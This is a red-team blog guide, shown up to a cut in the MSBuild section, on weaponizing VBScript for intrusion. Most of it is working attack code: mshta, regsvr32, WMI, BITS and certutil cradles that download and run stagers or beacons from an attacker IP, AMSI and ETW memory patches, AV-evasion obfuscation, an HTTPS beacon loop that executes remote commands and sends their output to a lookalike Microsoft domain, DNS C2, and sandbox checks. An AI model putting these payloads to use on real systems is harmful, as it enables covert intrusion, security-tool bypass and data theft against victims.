---
title: "VBScript Weaponization: AMSI Bypass, AV/FW Evasion & Payload Delivery"
date: 2026-03-19 00:00:00 +0000
categories: [Red Team, Weaponization]
tags: [vbscript, amsi-bypass, evasion, lolbins, mshta, wscript, cscript, payload-delivery, obfuscation, red-team, T1059.005]
description: "A deep-dive red team guide covering VBScript weaponization from initial execution through AMSI bypass, AV/FW evasion, obfuscation, LOLbin chaining, C2 comms, and real-world campaign analysis."
image:
  path: /assets/img/posts/vbscript-weaponization/banner.png
toc: true
---

## Overview

VBScript has been declared "deprecated" by Microsoft since 2023 — yet it remains one of the most weaponized scripting engines on the planet. Every major threat actor from **Turla** to **OilRig** to the **SHADOW#REACTOR** campaign continues to rely on it precisely because it lives inside Windows, executes through trusted binaries, and gives attackers access to the full COM automation stack.

This blog is a red team field guide covering VBScript from first principles to advanced weaponization. We cover:

- Where VBS fits in the kill chain (MITRE T1059.005)
- Every execution vector: wscript, cscript, mshta, WMI, regsvr32, rundll32
- AMSI bypass techniques — memory patching, InitFailed, WSH trick
- Obfuscation: chr() encoding, string splitting, Replace() chains, variable substitution
- Download cradles and payload delivery (XMLHTTP, WinHTTP, BITS)
- Firewall and network evasion (HTTPS C2, DNS tunnelling, trusted process abuse)
- LOLbin chaining: VBS → PowerShell → MSBuild → shellcode
- DotNetToJScript and SharpShooter for in-memory .NET execution
- Real-world campaigns: SHADOW#REACTOR, Grandoreiro/URSA, OilRig/OopsIE, Turla, WIRTE
- Sysmon Event IDs, Sigma rules, Splunk detections

Lab environment used throughout:

| Role | Value |
|------|-------|
| Attacker Machine | Kali Linux — `10.10.14.55` |
| Victim Machine | Windows 10/11 — `10.129.229.224` |
| Domain | `inlanefreight.local` |
| Attacker User | `hossam` / `HossamR3dT3am!` |
| Victim User | `eliot` |
| Shell Prompt | `root@root$` |

---

## VBScript in the Kill Chain

VBScript maps directly to **MITRE ATT&CK T1059.005 — Command and Scripting Interpreter: Visual Basic**. It spans multiple kill chain phases:

```
[Reconnaissance] → [Weaponization] ← VBS payloads crafted
                 → [Delivery]      ← Email attachments, HTA, phishing
                 → [Exploitation]  ← User opens .vbs / .hta
                 → [Installation]  ← VBS downloads + drops secondary stage
                 → [C2]            ← VBS beacon over HTTP/HTTPS/DNS
                 → [Actions]       ← Credential theft, lateral movement, ransomware
```

### Why VBScript?

| Feature | Why It Matters |
|---------|---------------|
| Pre-installed on every Windows version | No dropper needed |
| Runs via signed Microsoft binaries | Bypasses application whitelisting |
| Full COM automation access | Network, filesystem, registry, WMI |
| No compilation required | Rapid weaponization |
| Supported inside Office macros (VBA) | Macro → VBS drop chain |
| No PowerShell logging by default | Lower forensic footprint |
| mshta.exe runs HTA + VBS outside browser security | Browser security context bypass |

### Key MITRE Techniques

| Technique ID | Name | VBS Usage |
|-------------|------|-----------|
| T1059.005 | Visual Basic | Core execution engine |
| T1218.005 | Mshta | HTA/VBS proxy execution |
| T1218.010 | Regsvr32 | SCT → VBS/JScript execution |
| T1218.011 | Rundll32 | Shell32 → JS/VBS |
| T1197 | BITS Jobs | Download cradle |
| T1027 | Obfuscated Files | Chr(), Replace(), XOR |
| T1566.001 | Spearphishing Attachment | VBS in ZIP/email |
| T1055 | Process Injection | VBS → shellcode inject |
| T1112 | Registry Modification | WScript.Shell RegWrite |

---

## Execution Vectors

### 1. wscript.exe (Windows Script Host — GUI mode)

The default handler for `.vbs` files. Spawns GUI dialogs on errors.

```batch
rem Run a local VBScript
wscript.exe payload.vbs

rem Run silently (no error dialogs)
wscript.exe //B //Nologo payload.vbs

rem Force 32-bit WSH on 64-bit system
C:\Windows\SysWOW64\wscript.exe payload.vbs

rem Run from a UNC path (T1059.005 + T1021.002)
wscript.exe \\10.10.14.55\share\payload.vbs
```

### 2. cscript.exe (Windows Script Host — Console mode)

Preferred for automated execution; output goes to console.

```batch
rem Standard execution
cscript.exe //B //Nologo payload.vbs

rem Force specific engine
cscript.exe //E:vbscript payload.vbs

rem Remote execution via WMI (T1047)
wmic /node:10.129.229.224 /user:eliot /password:P@ss process call create "cscript.exe //B C:\Windows\Temp\payload.vbs"
```

### 3. mshta.exe (HTML Application Host)

Executes `.hta` files (HTML + VBScript/JScript). Runs outside IE security context and bypasses many application control policies.

```batch
rem Execute local HTA
mshta.exe payload.hta

rem Execute remote HTA (T1218.005)
mshta.exe http://10.10.14.55/payload.hta

rem Inline VBScript execution — no file needed
mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd /c whoami"",0,True:close")

rem Inline with close trick
mshta.exe "javascript:a=new ActiveXObject('WScript.Shell');a.Run('cmd /c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.55/stager.ps1\")',0,1);close()"
```

#### Minimal HTA template

```html
<html>
<head>
<script language="VBScript">
  Sub AutoOpen()
    Dim oShell
    Set oShell = CreateObject("WScript.Shell")
    oShell.Run "cmd /c powershell -ep bypass -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.55/stager.ps1')", 0, False
    Set oShell = Nothing
    window.close()
  End Sub
  AutoOpen
</script>
</head>
<body>
<p>Loading...</p>
</body>
</html>
```

### 4. regsvr32.exe + SCT (Squiblydoo — T1218.010)

Executes a COM scriptlet containing VBScript. Bypasses AppLocker default rules.

```batch
rem Remote SCT via regsvr32 (no file written to disk)
regsvr32 /s /n /u /i:http://10.10.14.55/payload.sct scrobj.dll
```

SCT file structure:

```xml
<?XML version="1.0"?>
<scriptlet>
<registration progid="PoC" classid="{DEADBEEF-1337-1337-1337-DEADBEEF1337}">
  <script language="VBScript">
    <![CDATA[
      Dim oShell
      Set oShell = CreateObject("WScript.Shell")
      oShell.Run "cmd /c powershell -ep bypass -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.55/stager.ps1')", 0, False
    ]]>
  </script>
</registration>
</scriptlet>
```

### 5. rundll32.exe + VBScript (T1218.011)

```batch
rem Execute VBScript via rundll32 + mshtml
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("cmd /c calc.exe",0,true);
```

### 6. WMI Execution (T1047)

```vbscript
' Execute command via WMI (local or remote)
Dim oWMI, oProcess
Set oWMI = GetObject("winmgmts:\\.\root\cimv2")
Set oProcess = oWMI.Get("Win32_Process")
oProcess.Create "cmd /c powershell -ep bypass -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.55/stager.ps1')", Null, Null, intPID
```

Remote WMI execution:

```vbscript
Dim oLocator, oService, oProcess
Set oLocator = CreateObject("WbemScripting.SWbemLocator")
Set oService  = oLocator.ConnectServer("10.129.229.224", "root\cimv2", "inlanefreight\eliot", "Password123!")
Set oProcess  = oService.Get("Win32_Process")
oProcess.Create "cmd /c whoami > C:\Windows\Temp\out.txt", Null, Null, intPID
```

### 7. Shell.Application / ShellExecute

```vbscript
' Alternate execution via Shell.Application COM
Dim oShell
Set oShell = CreateObject("Shell.Application")
oShell.ShellExecute "cmd.exe", "/c whoami > C:\Windows\Temp\out.txt", "", "open", 0
```

---

## AMSI Bypass Techniques

The Antimalware Scan Interface (AMSI) hooks into `wscript.exe`, `cscript.exe`, and `mshta.exe` through `amsi.dll`. Every script block is passed to `AmsiScanBuffer()` before execution. Here are the bypass techniques used in the wild.

### Technique 1 — WSH / InitFailed Trick (No Admin Required)

Discovered by James Forshaw (Tyranid). Exploits the way WScript/CScript loads AMSI.DLL. By replacing AMSI.DLL in a user-writable path with a copy of `wscript.exe`, the scripting engine's `AmsiInitialize` call fails, setting `hAmsiContext = nullptr` and disabling all scanning.

```batch
rem Step 1: Copy wscript.exe as amsi.dll in a user-writable path
rem (The file only needs to be a valid PE — its name fools LoadLibrary)
copy C:\Windows\System32\wscript.exe %TEMP%\amsi.dll

rem Step 2: Run your "real" payload via the fake amsi.dll binary
rem wscript.exe internally loads AMSI.DLL — on finding our decoy it gets a PE not a DLL
rem AmsiInitialize fails → hAmsiContext = nullptr → no scans
wscript.exe %TEMP%\amsi.dll actualPayload.vbs
```

> **Why it works:** `COleScript::Initialize()` calls `LoadLibraryExW("amsi.dll", LOAD_LIBRARY_SEARCH_SYSTEM32)`. If it fails to get `AmsiInitialize` or `AmsiScanString`, `hAmsiContext` stays null and AMSI never scans. Loading our fake DLL returns a PE handle where `GetProcAddress` for AMSI functions fails — triggering the no-scan path.

### Technique 2 — AmsiScanBuffer Patch via WScript.Shell + PowerShell

From within VBScript, spawn an elevated PowerShell process that patches `AmsiScanBuffer`, then execute the actual payload in that process. The patch writes `ret` bytes to the start of the function so it immediately returns `S_OK` without scanning.

```vbscript
' Stage 1 VBS: spawn PowerShell AMSI patcher then run payload
Dim oShell
Set oShell = CreateObject("WScript.Shell")

Dim patchCmd
patchCmd = "powershell -ep bypass -nop -w hidden -c """ & _
  "$a='" & Chr(65) & "msi'" & ";" & _
  "$b='ScanBuffer';" & _
  "$lib=[Reflection.Assembly]::LoadWithPartialName('System.Core');" & _
  "$ptr=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(" & _
    "([Runtime.InteropServices.Marshal]::ReadIntPtr(" & _
      "([System.Runtime.InteropServices.Marshal]::GetHINSTANCE([System.Reflection.Module]::GetLoadedModules() | Where{$_.Name -eq ($a+''+'.dll')}) + " & _
    "[Runtime.InteropServices.Marshal]::ReadInt32(" & _
      "[Runtime.InteropServices.Marshal]::GetHINSTANCE(([System.Reflection.Module]::GetLoadedModules() | Where{$_.Name -eq ($a+''+'.dll')})), 0x3C)) + 0x28))," & _
  "[Action]);" & _
  "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.55/stage2.ps1')"""

oShell.Run patchCmd, 0, False
```

The canonical AmsiScanBuffer patch in inline PowerShell (used as second stage):

```powershell
# stage2.ps1 — patches AmsiScanBuffer then loads Cobalt Strike / Sliver beacon
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
$LoadLibrary  = [Win32]::LoadLibrary("am" + "si.dll")
$Address      = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p            = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p) | Out-Null
$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)  # mov eax, 0x80070057; ret
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $Address, 6)
[Win32]::VirtualProtect($Address, [uint32]5, $p, [ref]$p) | Out-Null

# Load real payload now that AMSI is disabled
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.55/beacon.ps1')
```

### Technique 3 — AmsiScanBuffer Size-Zero Patch (sub edi, edi)

Patch replaces `mov edi, r8d` (moves scan-buffer length from r8 into edi) with `sub edi, edi` (zeroes it), so AMSI scans 0 bytes and reports clean.

```
# Original bytes at AmsiScanBuffer+0x1B:
44 8B F8     ; mov edi, r8d   (copy length argument)

# Patch bytes:
29 FF        ; sub edi, edi   (zero out length → scan 0 bytes → AMSI_RESULT_CLEAN)
```

```powershell
# PowerShell proof-of-concept for size-zero patch
$addr = [Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
$target = $addr + 0x1B
$p = 0
[Win32]::VirtualProtect($target, [uint32]2, 0x40, [ref]$p) | Out-Null
[System.Runtime.InteropServices.Marshal]::WriteByte($target,     [byte]0x29)
[System.Runtime.InteropServices.Marshal]::WriteByte($target + 1, [byte]0xFF)
[Win32]::VirtualProtect($target, [uint32]2, $p, [ref]$p) | Out-Null
```

### Technique 4 — OffSec AMSI Write Raid (No VirtualProtect, 2024)

Discovered by Victor "Vixx" Khoury (OffSec, April 2024). A writable pointer inside `System.Management.Automation.dll` stores the address of `AmsiScanBuffer`. Overwriting that pointer (which is already RW, no `VirtualProtect` needed) redirects AMSI calls to a NOP function.

```powershell
# Concept: find writable AmsiScanBuffer pointer in SMA.dll and redirect to dummy
$APIs = @"
using System;
using System.Runtime.InteropServices;
public class APIs {
    [DllImport("kernel32")] public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead);
    [DllImport("kernel32")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);
    [DllImport("kernel32")] public static extern IntPtr GetCurrentProcess();
    public static int Dummy() { return 0; }  // redirect target
}
"@
Add-Type $APIs
# Search backwards from ScanContent for the AmsiScanBuffer address, then overwrite
# (Full PoC: https://www.offsec.com/blog/amsi-write-raid-0day-vulnerability/)
```

### Technique 5 — amsiInitFailed (Classic, Obfuscated)

Set the `amsiInitFailed` private field to `$true` so the PowerShell AMSI initialization path marks itself as failed and skips all scans.

```powershell
# Raw (detected):
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Obfuscated variant 1 — string split:
$x = 'System.Management.Automation.A'+'msiU'+'tils'
$y = 'amsiInit'+'Failed'
[Ref].Assembly.GetType($x).GetField($y,'NonPublic,Static').SetValue($null,$true)

# Obfuscated variant 2 — char array:
$z = [char[]]@(65,109,115,105,73,110,105,116,70,97,105,108,101,100) -join ''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField($z,'NonPublic,Static').SetValue($null,$true)
```

Calling this from VBScript via `WScript.Shell`:

```vbscript
Dim oShell
Set oShell = CreateObject("WScript.Shell")
Dim bypassCmd
bypassCmd = "powershell -ep bypass -nop -w hidden -c " & Chr(34) & _
  "$x='System.Management.Automation.A'+'msiUtils';" & _
  "$y='amsiInit'+'Failed';" & _
  "[Ref].Assembly.GetType($x).GetField($y,'NonPublic,Static').SetValue($null,$true);" & _
  "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.55/payload.ps1')" & Chr(34)
oShell.Run bypassCmd, 0, False
```

### Technique 6 — ETW Block (Side Channel Disable)

Block Event Tracing for Windows to prevent telemetry from reaching EDR:

```vbscript
' Patch EtwEventWrite to ret immediately — silences ETW in current process
Dim oShell
Set oShell = CreateObject("WScript.Shell")
oShell.Run "powershell -ep bypass -nop -w hidden -c """ & _
  "$ntdll=[Reflection.Assembly]::LoadWithPartialName('ntdll');" & _
  "$addr=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(" & _
    "(New-Object Runtime.InteropServices.HandleRef($ntdll,$ntdll.GetMethod('EtwEventWrite').MethodHandle.GetFunctionPointer())),[Action]);" & _
  """", 0, False
```

---

## Obfuscation Techniques

AV/EDR products signature-match VBScript by looking for keywords like `WScript.Shell`, `CreateObject`, `Execute`, `powershell`, etc. These techniques break those signatures.

### 1. chr() Character Encoding

Replace literal strings with `Chr()` calls that build them at runtime.

```vbscript
' "WScript.Shell" encoded with Chr()
Dim sObj
sObj = Chr(87) & Chr(83) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & _
       Chr(46) & Chr(83) & Chr(104) & Chr(101) & Chr(108) & Chr(108)
' sObj = "WScript.Shell"
Dim oShell
Set oShell = CreateObject(sObj)
```

Helper: generate chr() encoded string

```python
# Python helper to chr()-encode any string for VBScript
def vbs_chr_encode(s):
    return " & ".join([f"Chr({ord(c)})" for c in s])

print(vbs_chr_encode("WScript.Shell"))
# Chr(87) & Chr(83) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(46) & Chr(83) & Chr(104) & Chr(101) & Chr(108) & Chr(108)
```

### 2. String Splitting and Concatenation

Break keywords across multiple string literals and concatenate at runtime:

```vbscript
' Broken: "CreateObject" split
Dim sCreate
sCreate = "Cre" & "ate" & "Obj" & "ect"

' Broken: "WScript.Shell" split
Dim sShell
sShell = "WScrip" & "t.Sh" & "ell"

' Broken: "powershell"
Dim sPS
sPS = "power" & Chr(115) & "hell"

Set oShell = CreateObject(sShell)
oShell.Run sPS & " -ep bypass -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.55/p.ps1')", 0, False
```

### 3. Replace() Chain Obfuscation

Use placeholder characters that are replaced at runtime:

```vbscript
' Encode payload with Replace() chain
Dim sPayload
sPayload = "XQXpXoXwXeXrXsXhXeXlXlX"
sPayload = Replace(sPayload, "XQX", "")
sPayload = Replace(sPayload, "X", "")
' Result: "powershell"

' Apply to full command
Dim sCmd
sCmd = "~p~o~w~e~r~s~h~e~l~l~ ~-~e~p~ ~b~y~p~a~s~s"
sCmd = Replace(sCmd, "~", "")
```

### 4. Variable Substitution + Dead Code Insertion

```vbscript
Option Explicit

' Fake function to confuse static analysis
Function Noise(x)
    Dim a, b, c
    a = 137 * x
    b = a / 7
    c = b + 99
    Noise = c
End Function

' Actual payload hidden inside innocent-looking variable names
Dim strCompanyName, strDeptName, strEmployeeID
strCompanyName = "WScrip"
strDeptName    = "t.She"
strEmployeeID  = "ll"

Dim objWorker
Set objWorker = CreateObject(strCompanyName & strDeptName & strEmployeeID)

Dim strTask
strTask = Chr(112) & "ower" & Chr(115) & "hell -ep bypass -nop -w hidden -c "
strTask = strTask & Chr(73) & Chr(69) & Chr(88) & "(New-Object Net.WebClient).DownloadString"
strTask = strTask & "('http://10.10.14.55/stager.ps1')"

objWorker.Run strTask, 0, False
```

### 5. Base64-Encoded Payload

```vbscript
' Base64 decode and execute via PowerShell
Dim oShell, sEncoded, sCmd
sEncoded = "cG93ZXJzaGVsbCAtZXAgYnlwYXNzIC1ub3AgLXcgaGlkZGVuIC1jIElFWChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTAuMTAuMTQuNTUvc3RhZ2VyLnBzMScpCg=="

Set oShell = CreateObject("WScript.Shell")
sCmd = "powershell -ep bypass -nop -w hidden -enc " & sEncoded
oShell.Run sCmd, 0, False
```

### 6. XOR Obfuscation in VBScript

```vbscript
' XOR decode at runtime
Function XorDecode(sEncoded, xorKey)
    Dim i, result
    result = ""
    For i = 1 To Len(sEncoded) Step 2
        Dim hexByte
        hexByte = Mid(sEncoded, i, 2)
        result = result & Chr(CInt("&H" & hexByte) Xor xorKey)
    Next
    XorDecode = result
End Function

' Encode "WScript.Shell" XOR 0x41:
' W=87, X=41 → 87 XOR 65 = 22 → "16" (hex)
' (pre-compute with Python: hex(ord(c) ^ 0x41) for c in "WScript.Shell")
Dim sEncObj
sEncObj = "16120207100504751702042d0b"  ' "WScript.Shell" XOR 0x41

Dim sDecoded
sDecoded = XorDecode(sEncObj, &H41)
Set oShell = CreateObject(sDecoded)
oShell.Run "calc.exe", 0, False
```

### 7. Multi-Layer Obfuscation (Chr + Split + Replace)

```vbscript
' Layer 1: use Chr() + split for object name
Dim p1, p2, p3
p1 = Chr(87) & Chr(83) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116)
p2 = Chr(46)
p3 = Chr(83) & Chr(104) & Chr(101) & Chr(108) & Chr(108)

' Layer 2: replace garbage in the command
Dim rawCmd
rawCmd = "p@@wer@@sh@@ell -@@ep by@@pass -no@@p -w h@@idden"
rawCmd = Replace(rawCmd, "@@", "")

' Final execution
Set oS = CreateObject(p1 & p2 & p3)
oS.Run rawCmd & " -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.55/p.ps1')", 0, False
```

---

## Download Cradles and Payload Delivery

### 1. XMLHTTP Object (Classic Download Cradle)

```vbscript
' Download file using MSXML2.XMLHTTP
Function DownloadFile(sURL, sDest)
    Dim oHTTP, oStream
    Set oHTTP = CreateObject("MSXML2.XMLHTTP")
    oHTTP.Open "GET", sURL, False
    oHTTP.Send

    Set oStream = CreateObject("ADODB.Stream")
    oStream.Open
    oStream.Type = 1  ' binary
    oStream.Write oHTTP.ResponseBody
    oStream.SaveToFile sDest, 2
    oStream.Close

    Set oStream = Nothing
    Set oHTTP   = Nothing
End Function

DownloadFile "http://10.10.14.55/beacon.exe", "C:\Windows\Temp\svchost32.exe"

Dim oShell
Set oShell = CreateObject("WScript.Shell")
oShell.Run "C:\Windows\Temp\svchost32.exe", 0, False
```

### 2. WinHTTP Download Cradle

```vbscript
' Download using WinHttp.WinHttpRequest.5.1 (supports HTTPS, proxy-aware)
Function WinHTTPDownload(sURL, sDest)
    Dim oHTTP, oStream
    Set oHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    oHTTP.Open "GET", sURL, False
    oHTTP.Option(6) = False  ' disable automatic redirects disclosure
    oHTTP.Send

    Set oStream = CreateObject("ADODB.Stream")
    oStream.Open
    oStream.Type = 1
    oStream.Write oHTTP.ResponseBody
    oStream.SaveToFile sDest, 2
    oStream.Close
End Function

WinHTTPDownload "https://10.10.14.55/c2/stage2.ps1", "C:\Windows\Temp\update.ps1"

Dim oShell
Set oShell = CreateObject("WScript.Shell")
oShell.Run "powershell -ep bypass -nop -w hidden -f C:\Windows\Temp\update.ps1", 0, False
```

### 3. ServerXMLHTTP (Proxy-Aware, Bypasses WinINET Filtering)

```vbscript
' Msxml2.ServerXMLHTTP bypasses WinINET proxy restrictions
Function ServerXMLDownload(sURL)
    Dim oHTTP
    Set oHTTP = CreateObject("Msxml2.ServerXMLHTTP.6.0")
    oHTTP.Open "GET", sURL, False
    oHTTP.Send
    ServerXMLDownload = oHTTP.ResponseText
End Function

Dim sScript
sScript = ServerXMLDownload("https://10.10.14.55/stage2.ps1")

' Execute downloaded script in-memory via PowerShell
Dim oShell
Set oShell = CreateObject("WScript.Shell")
oShell.Run "powershell -ep bypass -nop -w hidden -c """ & _
    "IEX([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" & _
    "BASE64_OF_SCRIPT')))" & """", 0, False
```

### 4. BITS Transfer (T1197 — Low and Slow)

BITS runs as a Windows service, uses system-level HTTP, and blends in with Windows Update traffic.

```vbscript
' Download via BITS — very low detection rate, blends with WU traffic
Dim oShell
Set oShell = CreateObject("WScript.Shell")
oShell.Run "bitsadmin /transfer ""WindowsUpdate"" /priority FOREGROUND " & _
    "https://10.10.14.55/stage2.exe C:\Windows\Temp\WUAgent.exe", 0, True
oShell.Run "C:\Windows\Temp\WUAgent.exe", 0, False
```

```vbscript
' PowerShell BITS via VBS
oShell.Run "powershell -ep bypass -nop -w hidden -c " & Chr(34) & _
    "Start-BitsTransfer -Source 'https://10.10.14.55/stage2.exe' " & _
    "-Destination 'C:\Windows\Temp\WUAgent.exe'" & Chr(34), 0, True
```

### 5. In-Memory Execution (Fileless)

Download script content and execute without touching disk:

```vbscript
' Fileless execution — PowerShell IEX from VBS
Dim oShell
Set oShell = CreateObject("WScript.Shell")
oShell.Run "powershell -ep bypass -nop -w hidden -c " & _
    Chr(34) & "IEX(New-Object Net.WebClient).DownloadString(" & _
    "'https://10.10.14.55/c2/shell.ps1')" & Chr(34), 0, False
```

---

## Firewall & Network Evasion

### 1. HTTPS C2 with Domain Fronting Blend-In

```vbscript
' Use WinHTTP over port 443 with TLS — looks like normal HTTPS traffic
Function C2Beacon(sC2URL, sData)
    Dim oHTTP
    Set oHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    oHTTP.Open "POST", sC2URL, False
    oHTTP.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    ' Blend with legitimate traffic — spoof User-Agent
    oHTTP.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    oHTTP.Send "data=" & sData
    C2Beacon = oHTTP.ResponseText
End Function

' Beacon loop — check in every 60 seconds
Do
    Dim cmd
    cmd = C2Beacon("https://updates.microsoft-cdn.net/check", "id=WIN-" & Environ("COMPUTERNAME"))
    If Len(cmd) > 0 Then
        Dim oShell
        Set oShell = CreateObject("WScript.Shell")
        Dim oExec
        Set oExec = oShell.Exec("cmd /c " & cmd)
        Dim sOut
        sOut = oExec.StdOut.ReadAll()
        C2Beacon "https://updates.microsoft-cdn.net/result", sOut
    End If
    WScript.Sleep 60000
Loop
```

### 2. DNS-Based C2 (Firewall Tunnel)

Most firewalls allow DNS (UDP 53) outbound. Encode C2 commands in DNS TXT queries:

```vbscript
' DNS-based C2 beacon using nslookup
Function DNSQuery(sDomain)
    Dim oShell, oExec, sResult
    Set oShell = CreateObject("WScript.Shell")
    Set oExec  = oShell.Exec("nslookup -type=TXT " & sDomain & " 8.8.8.8")
    sResult    = oExec.StdOut.ReadAll()
    ' Parse TXT record content
    Dim i
    i = InStr(sResult, Chr(34))
    If i > 0 Then
        DNSQuery = Mid(sResult, i + 1, InStr(i + 1, sResult, Chr(34)) - i - 1)
    Else
        DNSQuery = ""
    End If
End Function

' Beacon over DNS — command encoded in TXT record of c2domain
Dim sCmd
sCmd = DNSQuery("cmd." & Environ("COMPUTERNAME") & ".inlanefreight-updates.com")
If Len(sCmd) > 0 Then
    Dim oShell
    Set oShell = CreateObject("WScript.Shell")
    oShell.Run "cmd /c " & sCmd & " > C:\Windows\Temp\dns_out.txt", 0, True
    ' Exfil: encode output in DNS A record subdomain labels
End If
```

### 3. Trusted Process Proxy Execution

Route payload through a trusted parent process to evade behavioral detection:

```vbscript
' PPID spoofing: spawn payload as child of explorer.exe
' (requires SharpShooter or DotNetToJScript with PPID spoof capability)
Dim oShell
Set oShell = CreateObject("WScript.Shell")
' Use explorer.exe as cover process via ShellWindows COM hijack
Dim oShellWindows
Set oShellWindows = CreateObject("Shell.Application")
oShellWindows.Open "cmd.exe /c powershell -ep bypass -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.55/stager.ps1')"
```

### 4. Living Off the Land — certutil Download

```vbscript
' Use certutil as download cradle (T1105 + T1218)
Dim oShell
Set oShell = CreateObject("WScript.Shell")
oShell.Run "certutil -urlcache -split -f https://10.10.14.55/beacon.exe C:\Windows\Temp\beacon.exe", 0, True
oShell.Run "C:\Windows\Temp\beacon.exe", 0, False
```

### 5. Sandbox Evasion Checks

```vbscript
' Check for sandbox: low RAM, few processes, specific registry keys
Function IsSandbox()
    IsSandbox = False

    ' RAM check — sandboxes often have <1GB
    Dim oWMI, oCPU
    Set oWMI = GetObject("winmgmts:\\.\root\cimv2")
    For Each oCPU In oWMI.ExecQuery("SELECT * FROM Win32_ComputerSystem")
        If CDbl(oCPU.TotalPhysicalMemory) < 1073741824 Then
            IsSandbox = True
            Exit Function
        End If
    Next

    ' Uptime check — sandboxes often reboot fresh
    Dim oOS
    For Each oOS In oWMI.ExecQuery("SELECT * FROM Win32_OperatingSystem")
        Dim sLastBoot
        sLastBoot = oOS.LastBootUpTime
        Dim dtBoot, dtNow, diffMins
        ' If uptime < 5 minutes, likely fresh sandbox boot
        dtBoot   = CDate(Left(sLastBoot, 4) & "-" & Mid(sLastBoot, 5, 2) & "-" & Mid(sLastBoot, 7, 2) & " " & Mid(sLastBoot, 9, 2) & ":" & Mid(sLastBoot, 11, 2))
        dtNow    = Now()
        diffMins = DateDiff("n", dtBoot, dtNow)
        If diffMins < 5 Then
            IsSandbox = True
            Exit Function
        End If
    Next

    ' Process count — sandboxes run fewer processes
    Dim nProcs
    nProcs = 0
    For Each oProc In oWMI.ExecQuery("SELECT * FROM Win32_Process")
        nProcs = nProcs + 1
    Next
    If nProcs < 25 Then
        IsSandbox = True
    End If
End Function

If Not IsSandbox() Then
    ' Execute payload
    Dim oShell
    Set oShell = CreateObject("WScript.Shell")
    oShell.Run "powershell -ep bypass -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.55/stager.ps1')", 0, False
Else
    ' Act benign — open notepad, do nothing malicious
    Dim oFake
    Set oFake = CreateObject("WScript.Shell")
    oFake.Run "notepad.exe", 1, False
End If
```

---

## LOLbin Chaining

The real power of VBScript is chaining with other LOLbins to move execution across the kill chain with minimal footprint.

### Chain 1: VBS → PowerShell → Cobalt Strike

```
Email attachment (ZIP → VBS)
  └─ wscript.exe payload.vbs
        └─ powershell.exe -ep bypass -nop -w hidden
              └─ IEX(New-Object Net.WebClient).DownloadString(...)
                    └─ Cobalt Strike beacon reflective loader
```

```vbscript
' payload.vbs — stage 1
Dim oShell
Set oShell = CreateObject("WScript.Shell")
oShell.Run "powershell -ep bypass -nop -w hidden -c " & Chr(34) & _
    "IEX(New-Object Net.WebClient).DownloadString('https://10.10.14.55/cs.ps1')" & Chr(34), 0, False
```

### Chain 2: HTA → VBS → regsvr32 (AppLocker Bypass)

```
phishing email → payload.hta (mshta.exe)
  └─ drops payload.vbs to %TEMP%
        └─ wscript.exe //B payload.vbs
              └─ regsvr32 /s /n /u /i:http://10.10.14.55/loader.sct scrobj.dll
                    └─ COM scriptlet shellcode loader
```

```html
<!-- payload.hta — drops and runs VBS -->
<script language="VBScript">
Sub AutoOpen()
    Dim oFSO, oFile, oShell
    Set oFSO  = CreateObject("Scripting.FileSystemObject")
    Set oFile = oFSO.CreateTextFile(Environ("TEMP") & "\update.vbs", True)
    oFile.WriteLine "Set oShell = CreateObject(""WScript.Shell"")"
    oFile.WriteLine "oShell.Run ""regsvr32 /s /n /u /i:http://10.10.14.55/loader.sct scrobj.dll"", 0, False"
    oFile.Close

    Set oShell = CreateObject("WScript.Shell")
    oShell.Run "wscript.exe //B " & Environ("TEMP") & "\update.vbs", 0, False
    window.close()
End Sub
AutoOpen
</script>
```

### Chain 3: VBS → MSBuild → Shellcode (T1127.001)

MSBuild is a trusted Microsoft binary that compiles and executes C# code inline.

